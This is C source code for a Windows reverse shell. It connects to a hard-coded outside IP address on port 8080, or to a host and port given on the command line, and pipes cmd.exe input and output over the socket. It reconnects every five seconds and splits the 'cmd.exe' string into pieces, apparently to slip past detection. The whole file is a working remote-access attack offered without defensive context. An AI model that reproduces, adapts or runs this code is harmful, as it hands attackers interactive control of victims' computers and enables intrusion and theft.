#include<winsock2.h>
#include<windows.h>
#include<ws2tcpip.h>
#include<stdio.h>
//#include<iostream>
// #include<typeinfo>
// #include<string.h>
//using namespace std;


#pragma comment(lib, "Ws2_32.lib")

int Shell(char* host, int port){
    while(true){    // To run in loop and check for connection every 5 sec
        Sleep(5000);
        printf("[+] Starting Connection\n");
        SOCKET mySock;
        struct sockaddr_in saddr;
        WSADATA version;
        WSAStartup(MAKEWORD(2,2), &version);
        mySock = WSASocket(AF_INET,SOCK_STREAM,IPPROTO_TCP,NULL, (unsigned int)NULL, (unsigned int)NULL);
        saddr.sin_family = AF_INET;

        saddr.sin_addr.s_addr = inet_addr(host);
        saddr.sin_port = htons(port);

        int tryConnect = WSAConnect(mySock,(SOCKADDR*)&saddr,sizeof(saddr),NULL,NULL,NULL,NULL);

        // Checking if connection is Established
        if(tryConnect < 0){
            closesocket(mySock);
            WSACleanup();
            printf("[-] Connection Failed :(\n");
            //exit(0);
            continue;
        }
        else{
            printf("[+] Connection Established\n");
            char RecvData[1024],recv1[1024];
            memset(RecvData,0,sizeof(RecvData));
            printf("[+] Starting to Recieve Data\n");
            int RecvCode = recv(mySock, RecvData, 1024, 0);
            
            // Testing connection
            if(RecvCode < 0){
                closesocket(mySock);
                WSACleanup();
                printf("[-] Recieve Data Failed \n");
                //exit(0);
                continue;
            }
            else{
                printf("[+] Recieve Data Successfull\n");
                printf("[+] Starting Process\n");
                
                //Starting Process to run cmd.exe on execution
                char *arr[4] = { "cm","d.e","x","e" };
                char command[8] = "";

                snprintf(command, sizeof(command),"%s%s%s%s",arr[0],arr[1],arr[2],arr[3]);

                STARTUPINFO sinfo;
                PROCESS_INFORMATION pinfo;

                memset(&sinfo,0,sizeof(sinfo));
                sinfo.cb = sizeof(sinfo);
                sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
                sinfo.hStdInput = sinfo.hStdError = sinfo.hStdOutput = (HANDLE) mySock;

                CreateProcess(NULL,command,NULL,NULL,TRUE,0,NULL,NULL, &sinfo,&pinfo);
                WaitForSingleObject(pinfo.hProcess, INFINITE);
                CloseHandle(pinfo.hProcess);
                CloseHandle(pinfo.hThread);
                printf("[+] Process Running\n");

                memset(RecvData, 0, sizeof(RecvData));
                int RecvCode = recv(mySock, RecvData, 1024, 0);
                if(RecvCode <= 0){
                    closesocket(mySock);
                    WSACleanup();
                    printf("[-] No Data recieved\n");
                    //exit(0);
                    continue;
                }

                // Type bye or Bye to exit loop
                else if((RecvData[0] == 'b' || RecvData[0] == 'B' )&& RecvData[1] == 'y' && RecvData[2] == 'e'){
                    printf("[+] Exit signal Recieved\n");
                    closesocket(mySock);
                    WSACleanup();
                    exit(0);
                }
                // else{
                //     printf("++++++"<<typeid(RecvData).name()<<" "<<RecvData<<"++++++"<<typeid(bb).name()<<" "<<bb<<"+\n");
                // }

            }
        }
        printf("[ ] Retrying Connection\n");
    }
    return 0;
}

int main(int argc, char **argv){
    //FreeConsole();
    if(argc == 3){
        int port = atoi(argv[2]);
        Shell(argv[1],port);
    }
    else{
        int port = 8080;
        char host[] = "13.233.233.119";
        Shell(host,port);
    }
    return 0;
}